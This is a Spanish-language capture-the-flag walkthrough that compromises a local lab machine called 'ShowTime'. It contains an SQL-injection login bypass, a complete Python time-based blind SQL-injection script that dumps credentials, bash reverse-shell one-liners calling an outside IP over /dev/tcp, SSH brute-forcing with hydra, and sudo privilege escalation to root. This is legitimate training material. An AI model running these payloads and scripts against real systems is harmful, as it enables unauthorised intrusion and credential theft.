- Tags: #ShowTime #SQLInjection
---
[Maquina ShowTime](https://mega.nz/file/0L9nEQIT#W7C_nzun175xroRrKYOTcydum374ML-n24SANP_-k3w) -> Enlace de descarga al laboratorio

```bash
7z x showtime.zip # Descromprimimos el archivo
sudo bash auto_deploy.sh showtime.tar # Desplegamos el laboratorio
```

### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del target
ping -c 1 172.17.0.2 # Realizamos una traza ICMP para determnar si tenemos conectividad con el target

wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

### Fase Enumeracion Puertos:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-60000 #
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos deteccion de puertos expuesto en el target
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar los servicios y la version que corren detras de estos puertos.
```

```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0) # Servicio ssh expuesto
```

### Fase Enumeracion:
```bash
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu)) # Servicio web espuesto ubuntuNoble
```

```bash
http://172.17.0.2/index.html # Direccion URL de la pagina principal.
whatweb http://172.17.0.2 # Deteccion de las tecnoligas que emplea la web
```

```bash
nmap --script http-enum -p 80 172.17.0.2 # Lanzamos un script de Nmap de reconocimiento de rutas.

# Resultado
/css/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
/images/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
/js/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
```

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash # Realizamos fuzzing a los directorios

# Resultado
/images/              (Status: 200) [Size: 3747]
/icons/               (Status: 403) [Size: 275]
/assets/              (Status: 200) [Size: 739]
/icon/                (Status: 200) [Size: 4959]
/css/                 (Status: 200) [Size: 6307]
/js/                  (Status: 200) [Size: 4365]
/fonts/               (Status: 200) [Size: 6323]
/login_page/          (Status: 200) [Size: 2025]
/server-status/       (Status: 403) [Size: 275]
```

```bash
http://172.17.0.2/login_page/index.php # Tenemos un panel de inicio de sesion
```

```bash
admin' # Tenemos el campo username vulnerable.
admin' or 1=1-- - # Logramos acceder sin proporcionar password
```

```bash
gobuster dir -u http://172.17.0.2/login_page/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,txt,html,js # Fuzzeamos archivos

# Resultado 
/index.php            (Status: 200) [Size: 2025]
/home.php             (Status: 302) [Size: 0] [--> index.php]
/db.php               (Status: 200) [Size: 0] # Solo podremos ver le contenido si logramos aconteser un LFI
/auth.php             (Status: 200) [Size: 37]
```

**Nota** -> Realizaremos un script para automatizar la inyeccion SQL. Para obtener el nombre de la base de datos.
```python
#!/usr/bin/env python3
import requests
import signal
import sys
import time
import string
from termcolor import colored as c 

def ctrl_c(sig, frame):
    print(c(f"[-] Saliendo...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

main_url = "http://172.17.0.2/login_page/auth.php" # URL objetivo
characters = string.ascii_letters + string.digits + '_,' # Caracteres

def make_sqli():
    extracted_info_db = "" # Aqui se almacenara los caracteres validos.

    print(c(f"\n[*] Iniciando proceso....\n", "blue"))
    
    for position in range(1, 50):
        for character in characters:
            
            time_start = time.time()
            
            payload = "admin' OR IF(SUBSTRING(DATABASE(),{},1)='{}', SLEEP(0.35), 0)-- -".format(position, character) # Este es el payload para aplicar la inyeccion
            r = requests.post(main_url, data={"usuario": payload, "contraseña": "test"}) # Lanzamos la peticion.
            
            time_end = time.time()

            if time_end - time_start > 0.35:
                extracted_info_db += character
                break

    resultado = c(f"{extracted_info_db}", "blue")
    print(c(f"\n[+] Name database:  ( {resultado} )", "cyan"))


def main():
    make_sqli()

if __name__ == '__main__':
    main()
```

```bash
[+] Name database:  ( users ) # Tenemos el nombre de la base de datos actualmente en uso
```

**Nota** -> Ahora solo iremos modificando el **payload**
```python
# Ahora estamos dumpeando las tablas para la base de datos ( users )
payload = "admin' OR IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1 OFFSET 0),{},1)='{}', SLEEP(0.35),0)-- -".format(position, character)

[+] Name tables:  ( usuarios ) # Resultado
```

```python
# Ahora estamos dumpeando los nombres de las columnas para la tabla ( usuarios )
payload = "admin' OR IF(SUBSTRING((SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_name='usuarios' AND table_schema='users'),{},1)='{}', SLEEP(0.35),0)-- -".format(position, character)

[+] Name columns:  ( id,password,username ) # Resultado
```

```bash
# Ahora estamos dumpeando sus valores para las columnas (username, password)
payload = "admin' OR IF(SUBSTRING((SELECT GROUP_CONCAT(username, 0x3a, password SEPARATOR ', ') FROM users.usuarios),{},1)='{}', SLEEP(0.35),0)-- -".format(position, character)

[+] data:  ( lucas123321123321,santiago123456123456,joemiclaveesinhackeable ) # Tenemos este resultaod
```

###### Script Final:
Este nos permite obtener todas las credenciales de la base de datos.
```python
#!/usr/bin/env python3
import requests
import signal
import sys
import time
import string
from termcolor import colored as c 

def ctrl_c(sig, frame):
    print(c(f"[-] Saliendo...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

main_url = "http://172.17.0.2/login_page/auth.php"
characters = string.ascii_letters + string.digits + "_,:-@! "

def make_sqli():
    extracted_data = ""

    print(c(f"\n[*] Iniciando proceso....\n", "blue"))
    
    for position in range(1, 100):
        for character in characters:
            
            time_start = time.time()
            
            payload = "admin' OR IF(SUBSTRING((SELECT GROUP_CONCAT(username, 0x3a, password SEPARATOR ', ') FROM users.usuarios),{},1)='{}', SLEEP(0.35),0)-- -".format(position, character)
            r = requests.post(main_url, data={"usuario": payload, "contraseña": "test"})
            
            time_end = time.time()

            if time_end - time_start > 0.35:
                extracted_data += character
                break

    #resultado = c(f"{extracted_info_db}", "blue")
    #print(c(f"\n[+] Name columns:  ( {resultado} )", "cyan"))

     # Formatea el resultado final
    credenciales = extracted_data.split(", ")
    print(c(f"\n[+] Credenciales encontradas:", "cyan"))
    for cred in credenciales:
        print(c(f"   - {cred}", "green"))


def main():
    make_sqli()

if __name__ == '__main__':
    main()
```

```bash
[*] Iniciando proceso....

[+] Credenciales encontradas:
   - lucas:123321123321
   - santiago:123456123456
   - joe:miclaveesinhackeable
```

### Fase Intrusion:
**Nota** -> Por **ssh** no hemos logrado conectarnos con ninguna credencial
```bash
http://172.17.0.2/login_page/index.php # Aqui logramos iniciar session.

usuario: joe
contrasena: miclaveesinhackeable
```

Tenemos una session donde nos permite ejecutar comandos de **python** del cual si no esta bien sanitizado nos aprovecharemos para ejecutar comandos que nos permitan lograr la intrusion al target
```bash
import os
os.system("whoami")

www-data # Tenemos ejecucion remota de comandos.
```

```bash
nc -nlvp 443 # Nos ponemos en escucha.

import os # Aplicamos el tipico oneLiner para ganar acceso
os.system("bash -c 'exec bash -i &>/dev/tcp/192.168.100.24/443 <&1'")
```

### Fase Escalada Privilegios:
```bash
whoami

www-data # Tenemos una sesion con este usuario
```

```bash
find / -type f -iname "*txt" 2>/dev/null | xargs ls -l # Filtramos por archivos txt

/tmp/.hidden_text.txt # Tenemos este archivo oculto el cual intentaremos aplicar como diccionario de contrasenas para los usuarios del sistema incluyendo root
```

```bash
cat /tmp/.hidden_text.txt > /tmp/credentials.txt # Creamos una copia en el directorio temporal

# Usuarios del sistema
root
joe
luciano
```

```bash
 credentials.txt   users.txt # Ya teniendo listo los archivos con su respectivo contenido.
cat credentials.txt | tr '[:upper:]' '[:lower:]' > credential_passwords.txt # Convertimos todo a minusculas
```

```bash
hydra -L users.txt -P credential_passwords.txt ssh://172.17.0.2 # Aplicamos fuerza bruta.
[22][ssh] host: 172.17.0.2   login: joe   password: chittychittybangbang # Resultado
```

```bash
ssh-keygen -R 172.17.0.2 && ssh joe@172.17.0.2 # ( chittychittybangbang ) Logramos loguearnos como este usuario.
```

```bash
whoami # joe
```

```bash
sudo -l

User joe may run the following commands on 463b1bb5a0a4:
    (luciano) NOPASSWD: /bin/posh # Tenemos una via potencial de escalar al usuario luciano.
```

```bash
sudo -u luciano /bin/posh # Obtenemos una shell como ( luciano)
```

```bash
sudo -l

User luciano may run the following commands on 463b1bb5a0a4:
    (root) NOPASSWD: /bin/bash /home/luciano/script.sh # Tenemos una via potencial de elevar privilegios a root
```

Este es el contenido del script que podemos ejecutar como **root**. El cual modificaremos para obtener una shell como **root**.
```bash
#!/bin/bash

IP="192.168.1.100"
PORT="4444"

bash -c 'exec 5<>/dev/tcp/'$IP'/'$PORT'; cat <&5 | bash >&5 2>&5'
```

**Nota** -> Esta maquina no cuenta con editores de terminar asi que lo modificaremos atraves del comando **echo**
```bash
luciano@463b1bb5a0a4:~$ echo '#!/bin/bash
bash -p' > script.sh 
```

```bash
sudo /bin/bash /home/luciano/script.sh # Ejecutamos con privilegios este script
```

```bash
root@463b1bb5a0a4:/home/luciano# whoami
root # Logramos escalar privilegios.
```